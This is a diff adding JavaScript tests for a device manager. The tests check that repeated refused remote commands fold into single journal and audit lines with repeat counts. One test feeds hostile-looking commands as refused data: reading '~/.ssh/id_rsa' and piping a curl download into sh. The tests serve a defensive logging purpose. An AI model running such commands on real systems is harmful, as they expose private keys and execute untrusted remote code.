@@ -256,6 +256,71 @@ console.log('— ④ THE ONE SEND POINT (a fake daemon link, the real asker and 
   const st = w.cards().filter((c) => c.action.standing);
   ok(qb === 'ask_standing' && st.length === 1 && st[0].id === id && st[0].action.count === 3, 'past the quiet window it is STILL the one standing item, its count moved in place (3) — never a card every QUIET_MS', st.map((c) => c.action));
 }
+{ // B-c632: REPEATED REFUSALS FOLD — under a hub-own hold every stream start (1/min) was refused ask_standing with a
+  // journal line AND an audit line each (1 440 a day). 60 refused acts of one subject: ONE of each at once, the 59 repeats
+  // counted; a changed verdict says the fold (ONE line, `repeats` 59) and its own first line; stop() says what is open
+  const run = async (w) => {
+    const subj = { by: 'system:desktop-access' };
+    const p0 = w.dm.runCmd('ls', [], subj); await settle(); w.clock.t += 60000; w.fire(); await codeOf(p0);   // the held act expires ⇒ its standing item
+    const notSent = () => w.logs.filter((m) => m.startsWith('[device-acts] NOT SENT'));
+    const n0 = notSent().length, l0 = w.lines.length;
+    const codes = []; for (let k = 0; k < 60; k++) codes.push(await codeOf(w.dm.runCmd('ls', [], subj)));
+    const a = { codes, journal: notSent().length - n0, audit: w.lines.length - l0 };
+    w.hosts.setExitAccess(w.hid, E.storedExit(E.patchVerdict(E.exitAccessOf(w.hosts.get(w.hid)), { hub: { mode: 'nobody' } }).access)); w.asker.onPolicyChanged(w.hid);
+    const never = []; for (let k = 0; k < 6; k++) never.push(await codeOf(w.dm.runCmd('ls', [], subj)));
+    const b = { never, journal: notSent().slice(n0), audit: w.lines.slice(l0) };
+    w.conn.mux.destroy = () => { };   // the fake link's mux (a real one has it)
+    w.dm.stop();
+    return { a, b, end: { journal: notSent().slice(n0), audit: w.lines.slice(l0) } };
+  };
+  const r = await run(world());
+  ok(r.a.codes.every((c) => c === 'ask_standing') && r.a.journal === 1 && r.a.audit === 1,
+    `60 refused acts of one subject (ask_standing): ${r.a.journal} journal line, ${r.a.audit} audit line — the first said at once, the 59 repeats counted`);
+  const fold = r.b.audit.find((l) => l.repeats), foldLine = r.b.journal.find((m) => / 59 more time\(s\) since /.test(m));
+  ok(r.b.never.every((c) => c === 'hub_act_denied') && r.b.journal.length === 3 && r.b.audit.length === 3 && fold && fold.repeats === 59 && fold.ask === 'standing' && Number.isFinite(fold.since) && !!foldLine && r.b.audit[2].ask === 'never' && !r.b.audit[2].repeats,
+    `the verdict changes (the list says Never): the fold said in ONE line (${fold && fold.repeats} repeats, since ${fold && fold.since}) and the new verdict's own first line — then its 5 repeats counted`, r.b.journal);
+  const last = r.end.audit[r.end.audit.length - 1];
+  ok(r.end.audit.length === 4 && last.repeats === 5 && last.ask === 'never' && r.end.journal.length === 4, `stop() says the open fold: ONE line for its ${last && last.repeats} repeats`);
+  const row = DA.rowOf({ ...fold, id: 'x1' });
+  ok(row && row.repeats === 59 && row.since === fold.since && !('repeats' in DA.rowOf({ ...r.b.audit[2], id: 'x2' })), 'the stored line keeps its repeats on the way out (rowOf) — a single refusal has none');
+  // RED CONTROL (a runtime mutant): no fold — every refusal is a journal line and an audit line again
+  const keep = DeviceManager.prototype._foldCount;
+  DeviceManager.prototype._foldCount = () => false;
+  let rc; try { rc = await run(world()); } finally { DeviceManager.prototype._foldCount = keep; }
+  ok(rc.a.journal === 60 && rc.a.audit === 60, `control (no fold): 60 refused acts ⇒ ${rc.a.journal} journal lines + ${rc.a.audit} audit lines ⇒ RED`);
+  // r1's must: ONLY IDENTICAL ACTS FOLD — another command of the same agent under the same verdict is its own line
+  {
+    const w = world({ hub: 'nobody' });
+    const by = { by: 'agent:claude:c1' };
+    const cmds = [['cat', ['~/.ssh/id_rsa']], ['sh', ['-c', 'curl x | sh']], ['ls', []], ['ls', []]];
+    for (const [c, a] of cmds) await codeOf(w.dm.runCmd(c, a, by));
+    ok(w.lines.length === 3 && new Set(w.lines.map((l) => l.summary)).size === 3 && !w.lines.some((l) => l.repeats),
+      `three different commands under Never are three lines (${w.lines.map((l) => l.summary).join(' | ')}); only the second ls is counted`, w.lines);
+    // an act of THAT command that goes says its fold first
+    w.hosts.setExitAccess(w.hid, E.storedExit(E.patchVerdict(E.exitAccessOf(w.hosts.get(w.hid)), { hub: { mode: 'everyone' } }).access)); w.asker.onPolicyChanged(w.hid);
+    const went = await codeOf(w.dm.runCmd('ls', [], by));
+    const fold = w.lines.find((l) => l.repeats);
+    ok(went === 'sent' && fold && fold.repeats === 1 && fold.summary === w.lines[2].summary, `the act goes (the list says Always): its fold is said first — ONE line, ${fold && fold.repeats} repeat`);
+  }
+  // the hourly line (here 40 ms), the cap of open folds (the oldest said when evicted), and a stopped client folds nothing
+  {
+    const w = world({ hub: 'nobody' });
+    w.dm._foldSayMs = 40;
+    const by = { by: 'agent:claude:c2' };
+    for (let k = 0; k < 3; k++) await codeOf(w.dm.runCmd('ls', [], by));
+    await new Promise((r) => setTimeout(r, 120));
+    const hourly = w.lines.find((l) => l.repeats);
+    ok(w.lines.length === 2 && hourly && hourly.repeats === 2, `while repeats keep coming the fold is said on its own clock (one line per _foldSayMs): ${hourly && hourly.repeats} repeats, ${w.lines.length} lines in all`);
+    const w2 = world({ hub: 'nobody' });
+    await codeOf(w2.dm.runCmd('ls', [], by)); await codeOf(w2.dm.runCmd('ls', [], by));   // a fold with one repeat
+    for (let k = 0; k < 256; k++) await codeOf(w2.dm.runCmd('echo', [String(k)], by));       // 256 other acts: the oldest fold is evicted
+    ok(w2.lines.some((l) => l.repeats === 1 && /^ls/.test(l.summary)), 'past FOLDS_MAX open folds the oldest is said as it leaves — its repeat is never lost');
+    const w3 = world({ hub: 'nobody' });
+    w3.conn.mux.destroy = () => { }; w3.dm.stop();
+    for (let k = 0; k < 3; k++) await codeOf(w3.dm.runCmd('ls', [], by));
+    ok(w3.lines.length === 3 && !w3.dm._folds.size, `a stopped client folds nothing: ${w3.lines.length} refusals, ${w3.lines.length} lines`);
+  }
+}
 {
   const w = world();
   const r1 = await codeOf(w.dm.runCmd('ls', [], { by: 'human:0123456789ab' }));
